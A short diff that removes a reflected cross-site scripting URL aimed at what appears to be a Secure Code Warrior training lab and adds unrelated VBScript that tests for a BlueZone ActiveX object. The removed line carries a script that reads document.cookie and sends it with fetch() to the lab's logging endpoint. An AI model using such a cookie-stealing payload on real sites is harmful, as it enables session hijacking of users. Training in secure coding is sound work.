@@ -1,1 +1,6 @@
-http://mi-e979c36d-be45-46c5-a977-379b077bdbcf-0.mission.securecodewarrior.com/transaction/32%22%3E%3Cscript%3Evar%20stolenCookie%20=%20document.cookie;%20fetch('http://mi-e979c36d-be45-46c5-a977-379b077bdbcf-0.mission.securecodewarrior.com/labSession/v1/labLogger?cookie='+encodeURIComponent(stolenCookie));%3C/script%3E
+Set oBZ = CreateObject("BZWhll.WhllObj")
+If IsObject(oBZ) Then
+    MsgBox "BlueZone ActiveX object created successfully."
+Else
+    MsgBox "Failed to create BlueZone ActiveX object."
+End If
